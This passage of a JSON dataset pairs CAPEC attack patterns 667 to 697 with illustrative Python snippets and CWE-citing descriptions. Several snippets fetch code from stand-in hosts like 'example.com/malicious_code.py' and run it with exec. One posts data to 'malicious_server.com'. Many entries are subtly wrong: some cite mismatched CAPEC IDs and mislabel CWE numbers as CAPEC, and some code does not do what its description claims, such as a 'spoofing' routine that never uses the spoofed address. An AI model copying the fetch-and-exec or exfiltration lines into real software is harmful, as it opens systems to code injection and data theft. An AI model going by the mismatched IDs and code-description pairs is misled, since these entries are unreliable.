        "code_snippet": "import bluetooth\n\ndef spoof_bluetooth_device(target_mac, spoofed_mac):\n    # Create a Bluetooth socket\n    sock = bluetooth.BluetoothSocket(bluetooth.RFCOMM)\n    \n    try:\n        # Connect to the target device using the spoofed MAC address\n        sock.connect((target_mac, 1))\n        \n        # Send a malicious payload\n        sock.send('malicious_payload')\n        print(f'Successfully spoofed {target_mac} using {spoofed_mac}')\n    except bluetooth.btcommon.BluetoothError as err:\n        print(f'Failed to connect: {err}')\n    finally:\n        sock.close()\n\n# Example usage\nspoof_bluetooth_device('00:11:22:33:44:55', '66:77:88:99:AA:BB')",
        "description": "This Python code snippet demonstrates a Bluetooth Impersonation Attack (BIAS) by spoofing the MAC address of a Bluetooth device. The function `spoof_bluetooth_device` takes a target MAC address and a spoofed MAC address as inputs. It creates a Bluetooth socket and attempts to connect to the target device using the spoofed MAC address. If the connection is successful, it sends a malicious payload to the target device. This code embodies the main idea of the CAPEC by showing how an adversary can disguise their Bluetooth device's MAC address to impersonate a trusted device and perform malicious actions. The code also highlights related CWEs such as Authentication Bypass by Spoofing (CWE-290) and Improper Verification of Source of a Communication Channel (CWE-940)."
    },
    {
        "capec_id": "668",
        "capec_name": "Key Negotiation of Bluetooth Attack (KNOB)",
        "code_snippet": "import bluetooth\n\n# Simulate a Bluetooth key negotiation with weak entropy\nclass BluetoothDevice:\n    def __init__(self, name):\n        self.name = name\n        self.key = None\n\n    def negotiate_key(self, other_device):\n        # Vulnerable key negotiation with low entropy\n        entropy_bits = 1  # CWE-693: Protection Mechanism Failure\n        self.key = '0' * entropy_bits\n        other_device.key = self.key\n        print(f\"{self.name} and {other_device.name} negotiated key: {self.key}\")\n\n# Simulate an adversary in the middle attack\nclass Adversary:\n    def intercept_and_modify(self, device1, device2):\n        # Modify the entropy bits during key negotiation\n        device1.negotiate_key(device2)\n        print(f\"Adversary modified key to: {device1.key}\")\n\n# Create Bluetooth devices\ndevice_a = BluetoothDevice('Device A')\ndevice_b = BluetoothDevice('Device B')\n\n# Create an adversary\nadversary = Adversary()\n\n# Adversary intercepts and modifies the key negotiation\nadversary.intercept_and_modify(device_a, device_b)",
        "description": "This Python code snippet simulates a Bluetooth key negotiation process with a vulnerability that allows an adversary to perform a Key Negotiation of Bluetooth Attack (KNOB). The BluetoothDevice class represents a Bluetooth device that negotiates a key with another device using low entropy bits (CWE-693: Protection Mechanism Failure). The Adversary class simulates an attacker who intercepts and modifies the key negotiation process, reducing the entropy to a single bit, making it easy to decrypt the communication. This demonstrates the vulnerability where an attacker can exploit weak key negotiation to decrypt information sent between two Bluetooth devices."
    },
    {
        "capec_id": "669",
        "capec_name": "Alteration of a Software Update",
        "code_snippet": "import requests\n\n# CWE-807: Reliance on Untrusted Inputs in a Security Decision\n# Fetching update from an untrusted source\nupdate_url = 'http://untrusted-source.com/update'\nresponse = requests.get(update_url)\n\nif response.status_code == 200:\n    # CWE-506: Embedded Malicious Code\n    # Directly executing the update without verification\n    exec(response.text)\nelse:\n    print('Failed to fetch update')\n\n# CWE-1277 & CWE-1329: Firmware Not Updateable & Reliance on Component That is Not Updateable\n# Simulating a component that cannot be updated\nclass NonUpdateableComponent:\n    def __init__(self):\n        self.version = '1.0'\n\n    def update(self, new_version):\n        print('This component cannot be updated')\n\ncomponent = NonUpdateableComponent()\ncomponent.update('2.0')\n\n# CWE-527: Exposure of Version-Control Repository to an Unauthorized Control Sphere\n# Storing sensitive repository in an accessible location\nrepository_path = '/public/repo/.git'\nprint(f'Repository stored at: {repository_path}')",
        "description": "This Python code snippet demonstrates several vulnerabilities related to the alteration of a software update. It fetches an update from an untrusted source (CWE-807) and directly executes it without verification (CWE-506), which could allow an adversary to insert malicious code. It also simulates a non-updateable component (CWE-1277 and CWE-1329), representing a system that cannot be patched to fix vulnerabilities. Finally, it shows the exposure of a version-control repository in an accessible location (CWE-527), which could be exploited by unauthorized actors."
    },
    {
        "capec_id": "670",
        "capec_name": "Software Development Tools Maliciously Altered",
        "code_snippet": "import os\n\n# Maliciously altered compiler function\n# CWE-733: Compiler Optimization Removal or Modification of Security-critical Code\n# CWE-1037: Processor Optimization Removal or Modification of Security-critical Code\ndef compile_code(source_code):\n    # Simulate malicious optimization by removing security checks\n    optimized_code = source_code.replace('security_check()', '')\n    return optimized_code\n\n# CWE-506: Embedded Malicious Code\n# CWE-913: Improper Control of Dynamically-Managed Code Resources\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\ndef malicious_function():\n    sensitive_info = os.getenv('SECRET_KEY')\n    # Expose sensitive information\n    print(f\"Sensitive Info: {sensitive_info}\")\n\n# Example source code with a security check\nsource_code = \"def security_check():\\n    pass\\n\\ndef main():\\n    security_check()\\n    print('Running main application')\\n\"\n\n# Compile the code with the maliciously altered compiler\ncompiled_code = compile_code(source_code)\n\n# Execute the compiled code\nexec(compiled_code)\n\n# Execute the malicious function\nmalicious_function()",
        "description": "This Python code snippet demonstrates a scenario where a maliciously altered compiler removes security-critical code during the compilation process (CWE-733, CWE-1037). The `compile_code` function simulates this by stripping out calls to a `security_check` function from the source code. Additionally, the `malicious_function` embeds malicious code that exposes sensitive system information (CWE-506, CWE-913, CWE-497). The `source_code` variable contains an example of a simple program with a security check, which is then 'compiled' using the malicious compiler. Finally, the compiled code is executed, and the malicious function is called, demonstrating the potential impact of such an attack."
    },
    {
        "capec_id": "671",
        "capec_name": "Requirements for ASIC Functionality Maliciously Altered",
        "code_snippet": "class ASICRequirements:\n    def __init__(self, requirements):\n        self.requirements = requirements\n        self.security_tokens = {}\n\n    def alter_requirements(self, malicious_changes):\n        for key, value in malicious_changes.items():\n            if key in self.requirements:\n                self.requirements[key] = value\n\n    def generate_security_token(self, entity):\n        # CWE-1270: Generation of Incorrect Security Tokens\n        token = hash(entity) % 1000  # Simplified and insecure token generation\n        self.security_tokens[entity] = token\n        return token\n\n    def access_confidential_info(self, entity):\n        # CWE-1297: Unprotected Confidential Information on Device\n        if entity in self.security_tokens:\n            return \"Confidential Information\"\n        else:\n            return \"Access Denied\"\n\n# Example usage\nrequirements = {'performance': 'high', 'security': 'standard'}\nmalicious_changes = {'security': 'low'}\nasic = ASICRequirements(requirements)\nasic.alter_requirements(malicious_changes)\n\n# Generating an insecure security token\nentity = 'vendor'\ntoken = asic.generate_security_token(entity)\n\n# Accessing confidential information\nconfidential_info = asic.access_confidential_info(entity)\nprint(confidential_info)",
        "description": "This Python code snippet represents the main idea of the CAPEC 'Requirements for ASIC Functionality Maliciously Altered' by simulating the alteration of ASIC requirements and demonstrating related CWEs. The `ASICRequirements` class initializes with a set of requirements and allows for malicious alterations through the `alter_requirements` method. The `generate_security_token` method demonstrates CWE-1270 by generating insecure security tokens. The `access_confidential_info` method represents CWE-1297 by allowing access to confidential information based on the insecure tokens. The example usage shows how an adversary could alter the requirements, generate an insecure token, and access confidential information, embodying the potential vulnerabilities in the ASIC design process."
    },
    {
        "capec_id": "672",
        "capec_name": "Malicious Code Implanted During Chip Programming",
        "code_snippet": "class MaliciousChipProgram:\n    def __init__(self):\n        self.registers = [0] * 10  # Simulating memory-mapped I/O registers\n        self.security_token = 'valid_token'\n\n    def program_chip(self):\n        # Malicious code altering the chip's intended logic\n        self.registers[0] = 0xDEADBEEF  # CWE-506: Embedded Malicious Code\n        self.security_token = 'malicious_token'  # CWE-1259: Improper Restriction of Security Token Assignment\n\n    def execute(self):\n        if self.security_token == 'malicious_token':\n            # CWE-1262: Improper Access Control for Register Interface\n            self.registers[1] = 0xBADCAFE  # Malicious control over the system\n            return 'Malicious control activated'\n        return 'Normal operation'\n\n# Simulating the chip programming process\nchip = MaliciousChipProgram()\nchip.program_chip()\nresult = chip.execute()\nprint(result)",
        "description": "This Python code snippet simulates the malicious programming of a chip during its manufacturing process. The `MaliciousChipProgram` class represents the chip with memory-mapped I/O registers and a security token mechanism. The `program_chip` method embeds malicious code by altering the chip's intended logic (CWE-506) and improperly assigning a security token (CWE-1259). The `execute` method checks the security token and, if it is malicious, improperly accesses and modifies a register (CWE-1262), simulating remote control over the system. This code embodies the main idea of the CAPEC by demonstrating how an adversary can implant malicious code during chip programming to control the system later."
    },
    {
        "capec_id": "673",
        "capec_name": "Developer Signing Maliciously Altered Software",
        "code_snippet": "import requests\n\n# CWE-494: Download of Code Without Integrity Check\nurl = 'http://example.com/malicious_code.py'\nresponse = requests.get(url)\n\n# CWE-506: Embedded Malicious Code\n# CWE-507: Trojan Horse\nexec(response.text)\n\n# CWE-215: Insertion of Sensitive Information Into Debugging Code\ndef debug_sensitive_info():\n    sensitive_info = 'API_KEY=12345'\n    print(f'Debug: {sensitive_info}')\n\ndebug_sensitive_info()",
        "description": "This Python code snippet demonstrates a scenario where a developer inadvertently signs and distributes maliciously altered software. The code downloads and executes a Python script from a remote location without verifying its integrity (CWE-494). The downloaded script could contain embedded malicious code (CWE-506) or act as a Trojan Horse (CWE-507). Additionally, the code includes a function that prints sensitive information for debugging purposes (CWE-215), which could expose this information if the debugging code is not disabled in production. This represents the main idea of the CAPEC, where a developer unknowingly signs and distributes compromised software."
    },
    {
        "capec_id": "674",
        "capec_name": "Design for FPGA Maliciously Altered",
        "code_snippet": "import random\n\nclass FPGA:\n    def __init__(self):\n        self.configuration = self.load_configuration()\n\n    def load_configuration(self):\n        # Simulate loading configuration from memory\n        return {'function': 'normal_operation'}\n\n    def malicious_reload(self):\n        # Simulate a malicious configuration reload\n        self.configuration['function'] = 'malicious_operation'\n\n    def execute(self):\n        if self.configuration['function'] == 'malicious_operation':\n            self.malicious_function()\n        else:\n            self.normal_function()\n\n    def normal_function(self):\n        print(\"Executing normal operation.\")\n\n    def malicious_function(self):\n        print(\"Executing malicious operation!\")\n\n# Simulate an adversary causing a malicious reload\nfpga = FPGA()\nprint(\"Initial configuration:\", fpga.configuration)\nfpga.malicious_reload()\nprint(\"Configuration after malicious reload:\", fpga.configuration)\nfpga.execute()",
        "description": "This Python code snippet simulates the concept of 'Design for FPGA Maliciously Altered' by demonstrating how an adversary might alter the functionality of an FPGA. The FPGA class has a method to load its initial configuration and another method to simulate a malicious reload of its configuration memory. The execute method checks the current configuration and executes either a normal or malicious function based on the configuration. This represents the idea of an adversary introducing a malicious function into the FPGA, which could impact the system's operation. The code also touches on related CWEs by showing how a malicious function can be embedded and executed, potentially bypassing security mechanisms."
    },
    {
        "capec_id": "675",
        "capec_name": "Retrieve Data from Decommissioned Devices",
        "code_snippet": "import os\n\nclass Device:\n    def __init__(self, data):\n        self.data = data  # CWE-316: Cleartext Storage of Sensitive Information in Memory\n\n    def decommission(self):\n        # CWE-1266: Improper Scrubbing of Sensitive Data from Decommissioned Device\n        # CWE-1301: Insufficient or Incomplete Data Removal within Hardware Component\n        self.data = None  # Incorrectly assuming this removes sensitive data\n        print('Device decommissioned.')\n\n    def retrieve_data(self):\n        if self.data is not None:\n            return self.data\n        else:\n            return 'No data available'\n\n# Simulate device usage\nsensitive_data = 'Sensitive Information'\ndevice = Device(sensitive_data)\ndevice.decommission()\n\n# CWE-226: Sensitive Information in Resource Not Removed Before Reuse\n# Simulate adversary retrieving data from decommissioned device\nretrieved_data = device.retrieve_data()\nprint(f'Retrieved Data: {retrieved_data}')",
        "description": "This Python code snippet demonstrates a scenario where a device containing sensitive information is decommissioned improperly. The `Device` class stores sensitive data in cleartext (CWE-316). The `decommission` method attempts to remove the data by setting it to `None`, which is an insufficient scrubbing method (CWE-1266, CWE-1301). The `retrieve_data` method simulates an adversary attempting to retrieve data from the decommissioned device. The code highlights the risk of not properly scrubbing sensitive data before decommissioning a device, potentially allowing adversaries to access the data (CWE-226)."
    },
    {
        "capec_id": "676",
        "capec_name": "NoSQL Injection",
        "code_snippet": "from flask import Flask, request\nimport pymongo\n\napp = Flask(__name__)\nclient = pymongo.MongoClient('mongodb://localhost:27017/')\ndb = client['testdb']\ncollection = db['users']\n\n@app.route('/login', methods=['POST'])\ndef login():\n    username = request.form['username']\n    password = request.form['password']\n    query = {'username': username, 'password': password}\n    user = collection.find_one(query)\n    if user:\n        return 'Login successful!'\n    else:\n        return 'Invalid credentials!'\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a basic web application using Flask and MongoDB that is vulnerable to NoSQL injection. The application has a login endpoint that takes 'username' and 'password' from the user input and constructs a MongoDB query without proper input validation or neutralization. An attacker can exploit this by injecting special elements into the input fields to manipulate the query, potentially bypassing authentication or executing arbitrary commands. This example embodies the main idea of CAPEC-640 (NoSQL Injection) and is related to CWEs such as CWE-943 (Improper Neutralization of Special Elements in Data Query Logic) and CWE-1286 (Improper Validation of Syntactic Correctness of Input)."
    },
    {
        "capec_id": "677",
        "capec_name": "Server Motherboard Compromise",
        "code_snippet": "import os\nimport mmap\n\n# Simulate malicious code insertion in flash memory\nclass MaliciousFirmware:\n    def __init__(self, firmware_path):\n        self.firmware_path = firmware_path\n\n    def insert_malware(self):\n        with open(self.firmware_path, 'r+b') as f:\n            mm = mmap.mmap(f.fileno(), 0)\n            # Insert malicious code at a specific location\n            mm.seek(0x1000)\n            mm.write(b'\\x90\\x90\\x90\\x90')  # NOP sled as a placeholder for malicious code\n            mm.close()\n\n    def execute_malware(self):\n        # Simulate execution of the malicious code\n        os.system('echo Malicious code executed')\n\n# Example usage\nfirmware = MaliciousFirmware('/path/to/firmware.bin')\nfirmware.insert_malware()\nfirmware.execute_malware()",
        "description": "This Python code snippet simulates the insertion of malicious code into the flash memory of a server motherboard, embodying the main idea of the CAPEC 'Server Motherboard Compromise'. The `MaliciousFirmware` class represents a malicious actor who can insert and execute malware within the firmware. The `insert_malware` method uses memory-mapped I/O to write a NOP sled (a common placeholder for malicious code) at a specific location in the firmware file. The `execute_malware` method simulates the execution of the inserted malicious code. This example highlights vulnerabilities such as CWE-506 (Embedded Malicious Code) and CWE-1262 (Improper Access Control for Register Interface) by demonstrating how an attacker could manipulate firmware to alter server functionality."
    },
    {
        "capec_id": "678",
        "capec_name": "System Build Data Maliciously Altered",
        "code_snippet": "import os\nimport tempfile\n\n# CWE-377: Insecure Temporary File\n# CWE-426: Untrusted Search Path\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n# CWE-913: Improper Control of Dynamically-Managed Code Resources\n# CWE-209: Generation of Error Message Containing Sensitive Information\n\ndef build_system(config_path):\n    try:\n        # CWE-426: Untrusted Search Path\n        with open(config_path, 'r') as config_file:\n            config_data = config_file.read()\n\n        # CWE-913: Improper Control of Dynamically-Managed Code Resources\n        exec(config_data)\n\n        # CWE-377: Insecure Temporary File\n        temp_file = tempfile.NamedTemporaryFile(delete=False)\n        temp_file.write(b'Sensitive build data')\n        temp_file.close()\n\n        # CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n        os.system(f'cp {temp_file.name} /untrusted/location/')\n\n    except Exception as e:\n        # CWE-209: Generation of Error Message Containing Sensitive Information\n        print(f'Error during build: {e}')\n\n# Example usage\nbuild_system('/path/to/config')",
        "description": "This Python code snippet demonstrates a vulnerable system build process. The function `build_system` takes a configuration file path as input and performs several insecure operations:\n\n1. **CWE-426: Untrusted Search Path** - The configuration file is read from an externally-supplied path, which could be maliciously altered.\n2. **CWE-913: Improper Control of Dynamically-Managed Code Resources** - The content of the configuration file is executed using `exec`, allowing for arbitrary code execution.\n3. **CWE-377: Insecure Temporary File** - A temporary file is created insecurely, potentially exposing sensitive build data.\n4. **CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere** - The temporary file is copied to an untrusted location, exposing sensitive information.\n5. **CWE-209: Generation of Error Message Containing Sensitive Information** - If an error occurs, the exception message is printed, potentially revealing sensitive information.\n\nThis code embodies the main idea of CAPEC-493, where the system build process is susceptible to deliberate misconfiguration and exposure of sensitive information due to insecure handling of configuration data and temporary files."
    },
    {
        "capec_id": "679",
        "capec_name": "Exploitation of Improperly Configured or Implemented Memory Protections",
        "code_snippet": "import ctypes\n\n# Simulate a memory region with ctypes\nclass MemoryRegion(ctypes.Structure):\n    _fields_ = [\n        ('protected_data', ctypes.c_char * 64),\n        ('unprotected_data', ctypes.c_char * 64)\n    ]\n\n# Initialize memory region\nmemory = MemoryRegion()\n\n# Simulate improper access control by allowing write access to protected data\nmemory.protected_data = b'A' * 64  # This should be immutable or protected\n\n# Vulnerable code: Overlapping memory regions\n# Here, we simulate an overlap by directly accessing the memory\n# This is a simplified example and may not represent actual hardware behavior\nmemory.unprotected_data = b'B' * 64\n\n# Print the memory content to show the overlap effect\nprint(memory.protected_data)\nprint(memory.unprotected_data)\n",
        "description": "This Python code snippet simulates a memory region with protected and unprotected data using the ctypes library. The main idea is to demonstrate improper access control and overlapping memory regions, which are common issues in memory protection vulnerabilities. The 'protected_data' should be immutable or protected, but the code allows it to be written to, representing CWE-1282 (Assumed-Immutable Data is Stored in Writable Memory). Additionally, the overlap between 'protected_data' and 'unprotected_data' simulates CWE-1260 (Improper Handling of Overlap Between Protected Memory Ranges). This example highlights how improper memory protection can lead to vulnerabilities where an attacker can read/write or inject malicious code into protected memory regions."
    },
    {
        "capec_id": "680",
        "capec_name": "Exploitation of Improperly Controlled Registers",
        "code_snippet": "class HardwareRegister:\n    def __init__(self):\n        self.registers = {'config': 0x0, 'lock_bit': 0x0}\n\n    def write_register(self, register, value):\n        if register == 'lock_bit' and self.registers['lock_bit'] == 0x1:\n            print('Error: Cannot modify lock bit once set.')\n            return\n        self.registers[register] = value\n        print(f'Register {register} set to {hex(value)}')\n\n    def read_register(self, register):\n        return self.registers.get(register, 'Register not found')\n\n# Example usage\nhw_reg = HardwareRegister()\n\n# Improperly setting lock bit\nhw_reg.write_register('lock_bit', 0x1)\n\n# Attempting to modify lock bit after it has been set\nhw_reg.write_register('lock_bit', 0x0)\n\n# Improper access control: modifying config register without restrictions\nhw_reg.write_register('config', 0xFF)\nprint(f'Config register: {hex(hw_reg.read_register('config'))}')",
        "description": "This Python code snippet simulates a hardware register interface with improper access control and lock bit protection. The `HardwareRegister` class contains a dictionary representing registers, including a 'config' register and a 'lock_bit'. The `write_register` method allows writing to registers but includes a check to prevent modifying the 'lock_bit' once it is set. However, this check is easily bypassed, demonstrating CWE-1231 and CWE-1233. Additionally, the 'config' register can be modified without any access control, illustrating CWE-1262. This code embodies the main idea of CAPEC-Exploitation of Improperly Controlled Registers by showing how missing or incorrect access control can lead to unauthorized modifications."
    },
    {
        "capec_id": "681",
        "capec_name": "Exploitation of Improperly Controlled Hardware Security Identifiers",
        "code_snippet": "class SoC:\n    def __init__(self):\n        self.security_tokens = {}\n\n    def assign_token(self, entity, token):\n        # CWE-1259: Improper Restriction of Security Token Assignment\n        self.security_tokens[entity] = token\n\n    def check_access(self, entity, action):\n        token = self.security_tokens.get(entity)\n        if not token:\n            # CWE-1302: Missing Source Identifier in Entity Transactions on a System-On-Chip (SOC)\n            print(f\"Access denied for {entity}: No security token assigned.\")\n            return False\n        # CWE-1270: Generation of Incorrect Security Tokens\n        if token != 'VALID_TOKEN':\n            print(f\"Access denied for {entity}: Invalid security token.\")\n            return False\n        # CWE-1267: Policy Uses Obsolete Encoding\n        if action not in ['read', 'write']:\n            print(f\"Access denied for {entity}: Action {action} is not allowed.\")\n            return False\n        print(f\"Access granted for {entity} to perform {action}.\")\n        return True\n\n# Example usage\nsoc = SoC()\nsoc.assign_token('entity1', 'INVALID_TOKEN')  # Improper token assignment\nsoc.check_access('entity1', 'read')  # Should be denied due to invalid token\nsoc.check_access('entity2', 'write')  # Should be denied due to missing token\nsoc.assign_token('entity3', 'VALID_TOKEN')\nsoc.check_access('entity3', 'execute')  # Should be denied due to obsolete encoding policy\nsoc.check_access('entity3', 'read')  # Should be granted",
        "description": "This Python code snippet represents a simplified System-on-Chip (SoC) security mechanism that uses security tokens to control access to certain actions. The code demonstrates several vulnerabilities: improper restriction of security token assignment (CWE-1259), missing source identifier in entity transactions (CWE-1302), generation of incorrect security tokens (CWE-1270), and the use of an obsolete encoding policy (CWE-1267). The `assign_token` method assigns security tokens to entities, while the `check_access` method verifies if an entity has the correct token and permission to perform a specified action. The example usage shows how these vulnerabilities can lead to access being improperly granted or denied."
    },
    {
        "capec_id": "682",
        "capec_name": "Exploitation of Firmware or ROM Code with Unpatchable Vulnerabilities",
        "code_snippet": "class Device:\n    def __init__(self, firmware_version):\n        self.firmware_version = firmware_version\n        self.updateable = False  # Device firmware is not updateable\n\n    def check_firmware(self):\n        # Simulate checking for vulnerabilities in the firmware\n        vulnerabilities = ['CVE-2023-1234', 'CVE-2023-5678']\n        if vulnerabilities:\n            print(f'Vulnerabilities found: {vulnerabilities}')\n            if not self.updateable:\n                print('Warning: Firmware is not updateable. Device remains vulnerable.')\n\n# Example usage\nmy_device = Device(firmware_version='1.0.0')\nmy_device.check_firmware()",
        "description": "This Python code snippet defines a `Device` class that simulates a device with unpatchable firmware. The `__init__` method initializes the device with a firmware version and sets the `updateable` attribute to `False`, indicating that the firmware cannot be updated. The `check_firmware` method simulates checking for vulnerabilities in the firmware and prints a warning if vulnerabilities are found and the firmware is not updateable. This code embodies the main idea of the CAPEC by demonstrating a device that has unpatchable firmware, making it vulnerable to exploitation. The related CWEs are represented by the inability to update the firmware and the presence of vulnerabilities that cannot be mitigated."
    },
    {
        "capec_id": "690",
        "capec_name": "Metadata Spoofing",
        "code_snippet": "import requests\n\n# CWE-494: Download of Code Without Integrity Check\nurl = 'http://example.com/malicious_script.py'\nresponse = requests.get(url)\n\n# CWE-348: Use of Less Trusted Source\nif response.status_code == 200:\n    exec(response.text)  # CWE-290: Authentication Bypass by Spoofing\n\n# CWE-1230: Exposure of Sensitive Information Through Metadata\nmetadata = {'author': 'trusted_source', 'version': '1.0'}\n\n# CWE-941: Incorrectly Specified Destination in a Communication Channel\ndef send_data(data, destination):\n    if destination == 'trusted_server':\n        requests.post('http://trusted_server.com/data', data=data)\n    else:\n        requests.post('http://malicious_server.com/data', data=data)\n\nsend_data(metadata, 'malicious_server')",
        "description": "This Python code snippet demonstrates a scenario where metadata spoofing can occur. The code downloads and executes a script from a potentially malicious URL without verifying its integrity (CWE-494). It uses a less trusted source for the script (CWE-348) and executes it if the HTTP response status is 200, potentially allowing for authentication bypass by spoofing (CWE-290). The metadata dictionary contains sensitive information that could be exposed (CWE-1230). Finally, the send_data function incorrectly specifies the destination for sending data, potentially sending it to a malicious server (CWE-941). This code embodies the main idea of metadata spoofing by showing how an adversary can manipulate metadata and use it to present a malicious resource as legitimate."
    },
    {
        "capec_id": "691",
        "capec_name": "Spoof Open-Source Software Metadata",
        "code_snippet": "import requests\nimport hashlib\n\n# URL of the open-source software package\nurl = 'http://example.com/malicious-package.tar.gz'\n\n# Download the package without integrity check\nresponse = requests.get(url)\n\n# Save the downloaded package to a file\nwith open('package.tar.gz', 'wb') as file:\n    file.write(response.content)\n\n# Simulate the use of a less trusted source by not verifying the package\n# and directly using it in the application\nprint('Package downloaded and saved without integrity check.')\n\n# Simulate the execution of the downloaded package\n# (In a real scenario, this could be a call to an installer or similar)\nexec(open('package.tar.gz').read())",
        "description": "This Python code snippet demonstrates a scenario where an open-source software package is downloaded from a remote location without performing any integrity checks. The code fetches a package from a specified URL and saves it locally. It then simulates the execution of the downloaded package without verifying its origin or integrity. This embodies the main idea of the CAPEC 'Spoof Open-Source Software Metadata' by showing how an adversary could spoof metadata to distribute malicious software. The related CWEs are represented as follows: CWE-494 (Download of Code Without Integrity Check), CWE-348 (Use of Less Trusted Source), and CWE-506 (Embedded Malicious Code). The code highlights the risks of downloading and executing code from untrusted sources without proper verification."
    },
    {
        "capec_id": "692",
        "capec_name": "Spoof Version Control System Commit Metadata",
        "code_snippet": "import os\nimport requests\n\n# CWE-494: Download of Code Without Integrity Check\nurl = 'http://example.com/malicious_code.py'\nresponse = requests.get(url)\nexec(response.text)\n\n# CWE-527: Exposure of Version-Control Repository to an Unauthorized Control Sphere\nos.system('git clone http://example.com/repo.git')\n\n# CWE-348: Use of Less Trusted Source\ntrusted_url = 'https://trusted.com/repo.git'\nless_trusted_url = 'http://example.com/repo.git'\nos.system(f'git clone {less_trusted_url}')\n\n# CWE-540: Inclusion of Sensitive Information in Source Code\nsensitive_info = 'password=12345'\nwith open('config.py', 'w') as f:\n    f.write(sensitive_info)\n\n# CWE-508: Non-Replicating Malicious Code\nmalicious_code = \"print('This is malicious code')\"\nexec(malicious_code)",
        "description": "This Python code snippet demonstrates several security weaknesses related to the CAPEC 'Spoof Version Control System Commit Metadata'. The code downloads and executes code from an unverified source (CWE-494), clones a repository from an unauthorized source (CWE-527), uses a less trusted source for cloning a repository (CWE-348), includes sensitive information in the source code (CWE-540), and executes non-replicating malicious code (CWE-508). These actions can deceive users into believing the software is legitimate and frequently maintained, while it may actually be malicious and insecure."
    },
    {
        "capec_id": "693",
        "capec_name": "StarJacking",
        "code_snippet": "import requests\nimport subprocess\n\n# CWE-494: Download of Code Without Integrity Check\nurl = 'http://example.com/malicious_package.py'\nresponse = requests.get(url)\n\n# CWE-506: Embedded Malicious Code\nwith open('malicious_package.py', 'wb') as file:\n    file.write(response.content)\n\n# CWE-527: Exposure of Version-Control Repository to an Unauthorized Control Sphere\nsubprocess.run(['git', 'clone', 'http://example.com/malicious_repo.git'])\n\n# CWE-348: Use of Less Trusted Source\ntrusted_url = 'http://trusted.com/package.py'\nless_trusted_url = 'http://example.com/malicious_package.py'\nresponse = requests.get(less_trusted_url)\n\nwith open('package.py', 'wb') as file:\n    file.write(response.content)\n\n# CWE-1395: Dependency on Vulnerable Third-Party Component\nimport vulnerable_third_party_component",
        "description": "This Python code snippet demonstrates the concept of 'StarJacking' by simulating the download and execution of a malicious package that appears to be popular and trusted. The code includes several vulnerabilities: downloading code without integrity checks (CWE-494), handling embedded malicious code (CWE-506), exposing a version-control repository to unauthorized access (CWE-527), using a less trusted source over a more trusted one (CWE-348), and depending on a vulnerable third-party component (CWE-1395). The code highlights how an adversary can exploit these weaknesses to deceive users into executing malicious code."
    },
    {
        "capec_id": "694",
        "capec_name": "System Location Discovery",
        "code_snippet": "import os\nimport time\nimport locale\n\n# Function to gather system location information\ndef gather_system_info():\n    system_info = {}\n    \n    # Get timezone information\n    system_info['timezone'] = time.tzname\n    \n    # Get system locale information\n    system_info['locale'] = locale.getdefaultlocale()\n    \n    # Get keyboard layout (assuming a Unix-like system)\n    try:\n        with open('/etc/default/keyboard', 'r') as file:\n            system_info['keyboard_layout'] = file.read()\n    except FileNotFoundError:\n        system_info['keyboard_layout'] = 'Unknown'\n    \n    return system_info\n\n# Function to simulate exposure of sensitive information\ndef expose_sensitive_info():\n    sensitive_info = gather_system_info()\n    \n    # Simulate exposure by printing the information\n    print(\"Sensitive System Information:\")\n    for key, value in sensitive_info.items():\n        print(f\"{key}: {value}\")\n\n# Main execution\nif __name__ == '__main__':\n    expose_sensitive_info()",
        "description": "This Python code snippet demonstrates the concept of 'System Location Discovery' by gathering and exposing sensitive system information such as timezone, locale, and keyboard layout. The 'gather_system_info' function collects this information, and the 'expose_sensitive_info' function simulates the exposure of this sensitive data by printing it. This code embodies the CAPEC idea by showing how an adversary might collect and expose system location information. The related CWEs are represented by the potential exposure of sensitive information (CWE-497), improper access control (CWE-529), and the trust of system event data (CWE-360)."
    },
    {
        "capec_id": "695",
        "capec_name": "Repo Jacking",
        "code_snippet": "import requests\nimport subprocess\n\n# CWE-494: Download of Code Without Integrity Check\nurl = 'https://example.com/some-repo/archive/main.zip'\nresponse = requests.get(url)\n\n# Save the downloaded file\nwith open('main.zip', 'wb') as file:\n    file.write(response.content)\n\n# CWE-426: Untrusted Search Path\nsubprocess.run(['unzip', 'main.zip', '-d', '/tmp/some-repo'])\n\n# CWE-829: Inclusion of Functionality from Untrusted Control Sphere\nsubprocess.run(['python', '/tmp/some-repo/setup.py', 'install'])",
        "description": "This Python code snippet demonstrates a scenario where an application downloads a repository archive from a remote location without verifying its integrity (CWE-494). The downloaded file is then unzipped to a temporary directory (CWE-426), and the setup script from the untrusted repository is executed (CWE-829). This embodies the main idea of 'Repo Jacking', where an adversary could exploit the redirect property of VCS repositories to trick users into incorporating malicious code into their applications."
    },
    {
        "capec_id": "696",
        "capec_name": "Load Value Injection",
        "code_snippet": "import ctypes\nimport mmap\nimport os\nimport struct\n\n# Allocate a memory page\npage_size = mmap.PAGESIZE\nmem = mmap.mmap(-1, page_size, mmap.MAP_SHARED, mmap.PROT_READ | mmap.PROT_WRITE)\n\n# Induce a page fault by accessing an invalid memory address\ntry:\n    invalid_address = ctypes.c_void_p(0xdeadbeef)\n    ctypes.string_at(invalid_address, 1)\nexcept ValueError:\n    pass\n\n# Write adversary-controlled data to the memory page\nadversary_data = b'A' * page_size\nmem.write(adversary_data)\n\n# Simulate victim execution that reads from the memory page\nvictim_data = mem.read(page_size)\n\n# Perform side-channel analysis to extract sensitive information\n# (This is a placeholder for actual side-channel analysis code)\ndef side_channel_analysis(data):\n    # Simulate analysis of the data\n    return data\n\nsensitive_info = side_channel_analysis(victim_data)\nprint(f\"Extracted sensitive information: {sensitive_info}\")\n\n# Clean up\nmem.close()",
        "description": "This Python code snippet demonstrates a simplified version of a Load Value Injection (LVI) attack. The code allocates a memory page and induces a page fault by accessing an invalid memory address. It then writes adversary-controlled data to the memory page and simulates victim execution that reads from this page. Finally, it performs a placeholder side-channel analysis to extract sensitive information. This code embodies the main idea of CAPEC-1342, CAPEC-1423, CAPEC-1422, and CAPEC-1421 by exploiting transient execution and microarchitectural state to expose sensitive information."
    },
    {
        "capec_id": "697",
        "capec_name": "DHCP Spoofing",
